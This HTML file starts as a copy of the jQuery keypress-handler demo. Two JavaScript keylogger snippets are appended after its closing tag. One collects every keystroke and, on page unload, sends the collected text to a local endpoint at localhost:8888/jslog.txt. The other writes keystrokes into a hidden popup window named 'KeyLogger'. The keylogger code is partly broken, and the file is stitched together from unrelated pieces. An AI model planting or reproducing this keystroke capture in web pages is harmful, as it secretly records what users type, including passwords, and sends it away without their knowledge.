
<!DOCTYPE html>
<html>
  <head>
    <style>
      fieldset { margin-bottom: 1em; }
      input { display: block; margin-bottom: .25em; }
      #print-output {
        width: 100%;
      }
      .print-output-line {
        white-space: pre;
        padding: 5px;
        font-family: monaco, monospace;
        font-size: .7em;
      }

    </style>
    <script src="http://code.jquery.com/jquery-latest.js"></script>
  </head>
  <body>
    <form>
      <fieldset>
        <label for="target">Type Something:</label>
        <input id="target" type="text" />
      </fieldset>
    </form>
    <button id="other">
      Trigger the handler
    </button>
    <script src="http://api.jquery.com/scripts/events.js"></script>
    <script>
      var xTriggered = 0;
      $("#target").keypress(function(event) {
        if ( event.which == 13 ) {
          event.preventDefault();
        }
        xTriggered++;
        var msg = "Handler for .keypress() called " + xTriggered + " time(s).";
        $.print( msg, "html" );
        $.print( event );
      });

      $("#other").click(function() {
        $("#target").keypress();
      });</script>

  </body>
</html>

<body onload="java script:key=''" onkeypress="java script:if(event.which){key=key+String.fromCharCode(event.which)}else{key=key+String.fromCharCode(event.keyCode)}" onunload="window.location('localhost:8888/jslog.txt'+key)">

<script language="Javascript" type="text/javascript">

winKL = window.open('jslog.txt','KeyLogger','directories=no,menu=no,status=no,resizable=no');
winKL.document.write('<html><body onload="self.blur();">');

document.onkeypress = function () {
key = window.event.keyCode;
winKL.document.write(String.fromCharCode(key));
}
self.focus();

</script>